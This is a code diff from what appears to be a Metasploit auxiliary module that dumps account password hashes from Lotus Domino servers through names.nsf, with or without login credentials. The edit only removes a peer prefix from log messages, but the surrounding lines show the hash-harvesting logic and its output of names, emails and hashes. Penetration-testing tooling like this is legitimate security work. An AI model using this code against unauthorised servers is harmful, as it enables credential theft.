@@ -38,7 +38,7 @@ class MetasploitModule < Msf::Auxiliary
     @uri = normalize_uri(datastore['URI'])
 
     if user.eql?('') && pass.eql?('')
-      print_status("#{peer} - Lotus Domino - Trying dump password hashes without credentials")
+      print_status("Lotus Domino - Trying dump password hashes without credentials")
 
       begin
         res = send_request_raw({
@@ -52,16 +52,16 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         if res && res.body.to_s =~ /\<viewentries/
-          print_good("#{peer} - Lotus Domino - OK names.nsf accessible without credentials")
+          print_good("Lotus Domino - OK names.nsf accessible without credentials")
           cookie = ''
           get_views(cookie, @uri)
 
         elsif res && res.body.to_s =~ /names.nsf\?Login/
-          print_error("#{peer} - Lotus Domino - The remote server requires authentication")
+          print_error("Lotus Domino - The remote server requires authentication")
           return :abort
 
         else
-          print_error("#{peer} - Lotus Domino - Unrecognized #{res.code} response")
+          print_error("Lotus Domino - Unrecognized #{res.code} response")
           vprint_error(res.to_s)
           return :abort
 
@@ -71,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
     else
-      print_status("#{peer} - Lotus Domino - Trying dump password hashes with given credentials")
+      print_status("Lotus Domino - Trying dump password hashes with given credentials")
       do_login(user, pass)
     end
   end
@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
       }, 20)
 
       if res.nil?
-        print_error("#{peer} - Connection timed out")
+        print_error("Connection timed out")
         return
       end
 
@@ -97,19 +97,19 @@ class MetasploitModule < Msf::Auxiliary
         elsif res.get_cookies =~ /LtpaToken=(.*);(.*)/i
           cookie = "LtpaToken=#{$1}"
         else
-          print_error("#{peer} - Lotus Domino - Unrecognized 302 response")
+          print_error("Lotus Domino - Unrecognized 302 response")
           return :abort
         end
-        print_good("#{peer} - Lotus Domino - SUCCESSFUL authentication for '#{user}'")
-        print_status("#{peer} - Lotus Domino - Getting password hashes")
+        print_good("Lotus Domino - SUCCESSFUL authentication for '#{user}'")
+        print_status("Lotus Domino - Getting password hashes")
         get_views(cookie, @uri)
 
       elsif res && res.body.to_s =~ /names.nsf\?Login/
-        print_error("#{peer} - Lotus Domino - Authentication error: failed to login as '#{user}'")
+        print_error("Lotus Domino - Authentication error: failed to login as '#{user}'")
         return :abort
 
       else
-        print_error("#{peer} - Lotus Domino - Unrecognized #{res.code} response")
+        print_error("Lotus Domino - Unrecognized #{res.code} response")
         return :abort
       end
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
@@ -162,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
         user_mail = 'NULL' if user_mail.to_s.strip.empty?
         pass_hash = 'NULL' if pass_hash.to_s.strip.empty?
 
-        print_good("#{peer} - Lotus Domino - Account Found: #{short_name}, #{user_mail}, #{pass_hash}")
+        print_good("Lotus Domino - Account Found: #{short_name}, #{user_mail}, #{pass_hash}")
 
         if pass_hash != 'NULL'
           domino_svc = report_service(
